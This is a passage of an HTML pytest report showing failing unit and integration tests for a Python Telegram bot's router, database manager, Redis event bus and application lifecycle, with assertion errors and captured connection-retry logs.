          <td class="col-name">tests/test_router_database_context.py::TestRouterDatabaseContext::test_router_initialization_with_database_context</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.test_router_database_context.TestRouterDatabaseContext object at 0x7d1701918da0&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_router_initialization_with_database_context(self):<br/>        &quot;&quot;&quot;Test router initialization with database context.&quot;&quot;&quot;<br/>        # Create mock services<br/>        mock_user_service = Mock(spec=UserService)<br/>        mock_event_bus = Mock(spec=EventBus)<br/>        mock_database_manager = Mock(spec=DatabaseManager)<br/>    <br/>        # Initialize router with database context<br/>        router = Router(<br/>            user_service=mock_user_service,<br/>            event_bus=mock_event_bus,<br/>            database_manager=mock_database_manager<br/>        )<br/>    <br/>        # Verify context is set correctly<br/>        assert router.user_service == mock_user_service<br/>        assert router.event_bus == mock_event_bus<br/>        assert router.database_manager == mock_database_manager<br/>        assert router.has_database_context is True<br/>&gt;       assert router.has_event_context is True<br/><span class="error">E       AssertionError: assert &lt;Mock name=&#x27;mock.is_connected&#x27; id=&#x27;137537758821984&#x27;&gt; is True</span><br/><span class="error">E        +  where &lt;Mock name=&#x27;mock.is_connected&#x27; id=&#x27;137537758821984&#x27;&gt; = &lt;src.core.router.Router object at 0x7d170141fe30&gt;.has_event_context</span><br/><br/>tests/test_router_database_context.py:37: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_connect_all_mongo_failure</td>
          <td class="col-duration">15.02</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_manager.TestDatabaseManager object at 0x7d1701743410&gt;<br/>database_manager = &lt;src.database.manager.DatabaseManager object at 0x7d16f8f33950&gt;<br/>mock_config_manager = &lt;Mock spec=&#x27;ConfigManager&#x27; id=&#x27;137537759846592&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_connect_all_mongo_failure(self, database_manager, mock_config_manager):<br/>        &quot;&quot;&quot;Test connection failure when MongoDB connection fails.&quot;&quot;&quot;<br/>        # Mock the database config<br/>        mock_db_config = Mock()<br/>        mock_db_config.mongodb_uri = &quot;mongodb://localhost:27017&quot;<br/>        mock_db_config.mongodb_database = &quot;test_db&quot;<br/>        mock_db_config.sqlite_database_path = &quot;:memory:&quot;<br/>        mock_config_manager.get_database_config.return_value = mock_db_config<br/>    <br/>        # Mock MongoDB connection failure<br/>        with patch(&#x27;src.database.manager.MongoClient&#x27;) as mock_mongo_client, \<br/>             patch(&#x27;src.database.manager.sqlite3.connect&#x27;) as mock_sqlite_connect:<br/>    <br/>            # Mock MongoDB client to raise connection failure<br/>            mock_mongo_client.side_effect = ConnectionFailure(&quot;Connection failed&quot;)<br/>    <br/>            # Mock SQLite connection (should not be called due to early return)<br/>            mock_sqlite_instance = Mock()<br/>            mock_sqlite_connect.return_value = mock_sqlite_instance<br/>    <br/>            # Test connection<br/>            result = await database_manager.connect_all()<br/>    <br/>            # Verify MongoDB connection was attempted<br/>            assert mock_mongo_client.called<br/>    <br/>            # Verify SQLite connection was not attempted<br/>&gt;           assert not mock_sqlite_connect.called<br/><span class="error">E           AssertionError: assert not True</span><br/><span class="error">E            +  where True = &lt;MagicMock name=&#x27;connect&#x27; id=&#x27;137537619497984&#x27;&gt;.called</span><br/><br/>tests/database/test_manager.py:137: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: Connection failed
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: Connection failed
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: Connection failed
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: Connection failed
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: Connection failed
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_connect_all_sqlite_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_manager.TestDatabaseManager object at 0x7d1701743560&gt;<br/>database_manager = &lt;src.database.manager.DatabaseManager object at 0x7d16f8f302f0&gt;<br/>mock_config_manager = &lt;Mock spec=&#x27;ConfigManager&#x27; id=&#x27;137537619439024&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_connect_all_sqlite_failure(self, database_manager, mock_config_manager):<br/>        &quot;&quot;&quot;Test connection failure when SQLite connection fails.&quot;&quot;&quot;<br/>        # Mock the database config<br/>        mock_db_config = Mock()<br/>        mock_db_config.mongodb_uri = &quot;mongodb://localhost:27017&quot;<br/>        mock_db_config.mongodb_database = &quot;test_db&quot;<br/>        mock_db_config.sqlite_database_path = &quot;:memory:&quot;<br/>        mock_config_manager.get_database_config.return_value = mock_db_config<br/>    <br/>        # Mock MongoDB connection success but SQLite failure<br/>        with patch(&#x27;src.database.manager.MongoClient&#x27;) as mock_mongo_client, \<br/>             patch(&#x27;src.database.manager.sqlite3.connect&#x27;) as mock_sqlite_connect:<br/>    <br/>            # Mock successful MongoDB connection<br/>            mock_mongo_instance = Mock()<br/>            mock_mongo_instance.admin.command.return_value = True<br/>            mock_mongo_client.return_value = mock_mongo_instance<br/>    <br/>            # Mock SQLite connection failure<br/>            mock_sqlite_connect.side_effect = sqlite3.Error(&quot;SQLite connection failed&quot;)<br/>    <br/>            # Test connection<br/>            result = await database_manager.connect_all()<br/>    <br/>            # Verify MongoDB connection was attempted<br/>            assert mock_mongo_client.called<br/>            assert mock_mongo_instance.admin.command.called<br/>    <br/>            # Verify SQLite connection was attempted<br/>            assert mock_sqlite_connect.called<br/>    <br/>            # Verify result<br/>&gt;           assert result is False<br/><span class="error">E           assert True is False</span><br/><br/>tests/database/test_manager.py:176: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.manager:manager.py:176 Error connecting to SQLite database: SQLite connection failed
WARNING  src.database.manager:manager.py:72 Failed to connect to SQLite, continuing without it<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_get_mongo_db_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_manager.TestDatabaseManager object at 0x7d1701743e00&gt;<br/>database_manager = &lt;src.database.manager.DatabaseManager object at 0x7d16f8f7f560&gt;<br/><br/>    def test_get_mongo_db_success(self, database_manager):<br/>        &quot;&quot;&quot;Test successful MongoDB database retrieval.&quot;&quot;&quot;<br/>        # Set up mock MongoDB client<br/>        mock_mongo_client = Mock()<br/>        mock_mongo_db = Mock()<br/>&gt;       mock_mongo_client.__getitem__.return_value = mock_mongo_db<br/><br/>tests/database/test_manager.py:288: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;Mock id=&#x27;137537619752144&#x27;&gt;, name = &#x27;__getitem__&#x27;<br/><br/>    def __getattr__(self, name):<br/>        if name in {&#x27;_mock_methods&#x27;, &#x27;_mock_unsafe&#x27;}:<br/>            raise AttributeError(name)<br/>        elif self._mock_methods is not None:<br/>            if name not in self._mock_methods or name in _all_magics:<br/>                raise AttributeError(&quot;Mock object has no attribute %r&quot; % name)<br/>        elif _is_magic(name):<br/>&gt;           raise AttributeError(name)<br/><span class="error">E           AttributeError: __getitem__</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:660: AttributeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_publish_redis_failure_fallback_to_local_queue</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_bus.TestEventBus object at 0x7d17018027b0&gt;<br/>event_bus = &lt;src.events.bus.EventBus object at 0x7d16f8fbbe60&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_publish_redis_failure_fallback_to_local_queue(self, event_bus):<br/>        &quot;&quot;&quot;Test event publishing when Redis fails, fallback to local queue.&quot;&quot;&quot;<br/>        # Set up mock Redis connection that fails<br/>        mock_redis_client = AsyncMock()<br/>        mock_redis_client.publish = AsyncMock(side_effect=Exception(&quot;Redis error&quot;))<br/>        event_bus._redis_client = mock_redis_client<br/>        event_bus._is_connected = True<br/>    <br/>        # Test event payload<br/>        event_payload = {<br/>            &quot;user_id&quot;: &quot;test_user_123&quot;,<br/>            &quot;content_id&quot;: &quot;content_001&quot;,<br/>            &quot;reaction_type&quot;: &quot;like&quot;<br/>        }<br/>    <br/>        # Test publishing<br/>        result = await event_bus.publish(&quot;reaction_detected&quot;, event_payload)<br/>    <br/>        # Verify Redis publish was attempted<br/>        assert mock_redis_client.publish.called<br/>    <br/>        # Verify event was queued locally as fallback<br/>&gt;       assert len(event_bus._local_queue) == 1<br/><span class="error">E       assert 0 == 1</span><br/><span class="error">E        +  where 0 = len([])</span><br/><span class="error">E        +    where [] = &lt;src.events.bus.EventBus object at 0x7d16f8fbbe60&gt;._local_queue</span><br/><br/>tests/events/test_bus.py:264: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.bus:bus.py:545 Redis publish failed: Redis error<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_close_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_bus.TestEventBus object at 0x7d1701801be0&gt;<br/>event_bus = &lt;src.events.bus.EventBus object at 0x7d16f8fe0f80&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_close_success(self, event_bus):<br/>        &quot;&quot;&quot;Test successful closure of event bus connections.&quot;&quot;&quot;<br/>        # Set up mock Redis connection<br/>        mock_redis_client = AsyncMock()<br/>        mock_redis_client.close = AsyncMock()<br/>        event_bus._redis_client = mock_redis_client<br/>    <br/>        # Set up mock flush task<br/>        mock_flush_task = AsyncMock()<br/>        mock_flush_task.done.return_value = False<br/>        event_bus._flush_task = mock_flush_task<br/>    <br/>        # Add some test data to queue<br/>        event_bus._local_queue = [{&quot;test&quot;: &quot;event&quot;}]<br/>    <br/>        # Test closure with mock file persistence<br/>        with patch(&#x27;src.events.bus.open&#x27;) as mock_open, \<br/>             patch(&#x27;src.events.bus.pickle.dump&#x27;) as mock_pickle_dump:<br/>    <br/>            mock_file = MagicMock()<br/>            mock_open.return_value.__enter__.return_value = mock_file<br/>    <br/>            # Test closure<br/>            await event_bus.close()<br/>    <br/>            # Verify Redis connection was closed<br/>            assert mock_redis_client.close.called<br/>    <br/>            # Verify flush task was cancelled<br/>&gt;           assert mock_flush_task.cancel.called<br/><span class="error">E           AssertionError: assert False</span><br/><span class="error">E            +  where False = &lt;AsyncMock name=&#x27;mock.cancel&#x27; id=&#x27;137537738724160&#x27;&gt;.called</span><br/><span class="error">E            +    where &lt;AsyncMock name=&#x27;mock.cancel&#x27; id=&#x27;137537738724160&#x27;&gt; = &lt;AsyncMock id=&#x27;137537619990080&#x27;&gt;.cancel</span><br/><br/>tests/events/test_bus.py:423: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_close_redis_failure</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_bus.TestEventBus object at 0x7d1701801520&gt;<br/>event_bus = &lt;src.events.bus.EventBus object at 0x7d16f8ebca70&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_close_redis_failure(self, event_bus):<br/>        &quot;&quot;&quot;Test closure when Redis connection fails.&quot;&quot;&quot;<br/>        # Set up mock Redis connection that fails to close<br/>        mock_redis_client = AsyncMock()<br/>        mock_redis_client.close = AsyncMock(side_effect=Exception(&quot;Redis close error&quot;))<br/>        event_bus._redis_client = mock_redis_client<br/>    <br/>        # Set up mock flush task<br/>        mock_flush_task = AsyncMock()<br/>        mock_flush_task.done.return_value = False<br/>        event_bus._flush_task = mock_flush_task<br/>    <br/>        # Test closure (should not raise exception even with Redis failure)<br/>        with patch(&#x27;src.events.bus.open&#x27;), patch(&#x27;src.events.bus.pickle.dump&#x27;):<br/>            await event_bus.close()<br/>    <br/>        # Verify Redis close was attempted<br/>        assert mock_redis_client.close.called<br/>    <br/>        # Verify flush task was cancelled<br/>&gt;       assert mock_flush_task.cancel.called<br/><span class="error">E       AssertionError: assert False</span><br/><span class="error">E        +  where False = &lt;AsyncMock name=&#x27;mock.cancel&#x27; id=&#x27;137537618302768&#x27;&gt;.called</span><br/><span class="error">E        +    where &lt;AsyncMock name=&#x27;mock.cancel&#x27; id=&#x27;137537618302768&#x27;&gt; = &lt;AsyncMock id=&#x27;137537618962880&#x27;&gt;.cancel</span><br/><br/>tests/events/test_bus.py:453: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.events.bus:bus.py:902 Error closing Redis connection: Redis close error<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBusIntegration::test_event_bus_properties</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_bus.TestEventBusIntegration object at 0x7d1701800170&gt;<br/>temp_event_bus = &lt;async_generator object TestEventBusIntegration.temp_event_bus at 0x7d16f8e5c400&gt;<br/><br/>    def test_event_bus_properties(self, temp_event_bus):<br/>        &quot;&quot;&quot;Test that EventBus has all required properties.&quot;&quot;&quot;<br/>        event_bus = temp_event_bus<br/>    <br/>        # Test that all required attributes exist<br/>&gt;       assert hasattr(event_bus, &#x27;_redis_client&#x27;)<br/><span class="error">E       AssertionError: assert False</span><br/><span class="error">E        +  where False = hasattr(&lt;async_generator object TestEventBusIntegration.temp_event_bus at 0x7d16f8e5c400&gt;, &#x27;_redis_client&#x27;)</span><br/><br/>tests/events/test_bus.py:592: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/events/test_bus.py::test_event_bus_with_event_models</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">def test_event_bus_with_event_models():<br/>        &quot;&quot;&quot;Test EventBus integration with event models.&quot;&quot;&quot;<br/>        # Create an event using the event models<br/>        event = create_event(<br/>            &quot;user_interaction&quot;,<br/>            user_id=&quot;test_user_123&quot;,<br/>            action=&quot;start&quot;,<br/>            context={&quot;source&quot;: &quot;test&quot;}<br/>        )<br/>    <br/>        # Verify event was created correctly<br/>        assert isinstance(event, BaseEvent)<br/>        assert event.event_type == &quot;user_interaction&quot;<br/>        assert event.user_id == &quot;test_user_123&quot;<br/>        assert event.action == &quot;start&quot;<br/>&gt;       assert &quot;context&quot; in event.payload<br/><span class="error">E       AssertionError: assert &#x27;context&#x27; in {}</span><br/><span class="error">E        +  where {} = UserInteractionEvent(event_id=&#x27;cc4406b9-6ad3-4c1b-9615-750811ecc16e&#x27;, event_type=&#x27;user_interaction&#x27;, timestamp=datetim...01b55874-0dbd-458e-880b-d1a1f31171e2&#x27;, user_id=&#x27;test_user_123&#x27;, payload={}, action=&#x27;start&#x27;, context={&#x27;source&#x27;: &#x27;test&#x27;}).payload</span><br/><br/>tests/events/test_bus.py:675: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_narrative_router_prefix_and_tags</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_api.TestAPIIntegration object at 0x7d1701649580&gt;<br/><br/>    def test_narrative_router_prefix_and_tags(self):<br/>        &quot;&quot;&quot;Test that narrative router has correct prefix and tags.&quot;&quot;&quot;<br/>&gt;       assert narrative_router.prefix == &quot;/api/v1/narrative&quot;<br/><span class="error">E       AssertionError: assert &#x27;&#x27; == &#x27;/api/v1/narrative&#x27;</span><br/><span class="error">E         - /api/v1/narrative</span><br/><br/>tests/integration/test_api.py:479: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_app_integration.py::TestBotApplicationIntegration::test_full_application_lifecycle</td>
          <td class="col-duration">40.15</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_app_integration.TestBotApplicationIntegration object at 0x7d170169ec00&gt;<br/>bot_app = &lt;src.core.application.BotApplication object at 0x7d16f8ebd670&gt;<br/>mock_env_vars = {&#x27;BOT_TOKEN&#x27;: &#x27;1234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw&#x27;, &#x27;LOG_LEVEL&#x27;: &#x27;DEBUG&#x27;, &#x27;WEBHOOK_URL&#x27;: &#x27;https://example.com/webhook&#x27;}<br/><br/>    @pytest.mark.integration<br/>    @pytest.mark.asyncio<br/>    async def test_full_application_lifecycle(self, bot_app, mock_env_vars):<br/>        &quot;&quot;&quot;Test the complete application lifecycle.&quot;&quot;&quot;<br/>        with patch.dict(&#x27;os.environ&#x27;, mock_env_vars):<br/>            # Test initialization<br/>            assert bot_app is not None<br/>            assert not bot_app.is_running<br/>    <br/>            # Test startup<br/>            with patch.object(bot_app.config_manager, &#x27;validate_config&#x27;, return_value=True):<br/>                success = await bot_app.start()<br/>                assert success<br/>                assert bot_app.is_running<br/>    <br/>            # Test processing update<br/>            test_update = SecureTestDataFactory.create_test_webhook_payload()<br/>            response = await bot_app.process_update(test_update)<br/>    <br/>            # Test shutdown<br/>            success = await bot_app.stop()<br/>&gt;           assert success<br/><span class="error">E           assert False</span><br/><br/>tests/integration/test_app_integration.py:51: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf34ee88ed7674ef4ee92d, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf34f488ed7674ef4ee92e, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf34fb88ed7674ef4ee92f, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf350488ed7674ef4ee930, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf351188ed7674ef4ee931, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize
ERROR    src.utils.errors:errors.py:125 Error occurred: Polling is not started
ERROR    src.core.application:application.py:184 Error during bot shutdown: An unexpected error occurred. Please try again or contact support.<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_app_integration.py::TestBotApplicationIntegration::test_graceful_shutdown_integration</td>
          <td class="col-duration">40.43</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_app_integration.TestBotApplicationIntegration object at 0x7d170169f980&gt;<br/>bot_app = &lt;src.core.application.BotApplication object at 0x7d16f8e9ea50&gt;<br/>mock_env_vars = {&#x27;BOT_TOKEN&#x27;: &#x27;1234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw&#x27;, &#x27;LOG_LEVEL&#x27;: &#x27;DEBUG&#x27;, &#x27;WEBHOOK_URL&#x27;: &#x27;https://example.com/webhook&#x27;}<br/><br/>    @pytest.mark.integration<br/>    @pytest.mark.asyncio<br/>    async def test_graceful_shutdown_integration(self, bot_app, mock_env_vars):<br/>        &quot;&quot;&quot;Test graceful shutdown integration.&quot;&quot;&quot;<br/>        with patch.dict(&#x27;os.environ&#x27;, mock_env_vars):<br/>            with patch.object(bot_app.config_manager, &#x27;validate_config&#x27;, return_value=True):<br/>                # Start application<br/>                success = await bot_app.start()<br/>                assert success<br/>                assert bot_app.is_running<br/>    <br/>                # Simulate ongoing processing<br/>                async def long_running_task():<br/>                    await asyncio.sleep(0.1)<br/>                    return &quot;completed&quot;<br/>    <br/>                # Start a task<br/>                task = asyncio.create_task(long_running_task())<br/>    <br/>                # Shutdown should complete gracefully<br/>                shutdown_success = await bot_app.stop()<br/>&gt;               assert shutdown_success<br/><span class="error">E               assert False</span><br/><br/>tests/integration/test_app_integration.py:231: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35df88ed7674ef4ee94b, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35e588ed7674ef4ee94c, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35ec88ed7674ef4ee94d, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-239&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-240&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35f588ed7674ef4ee94e, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-77&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-78&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-83&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-84&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-213&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-214&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-219&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-220&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
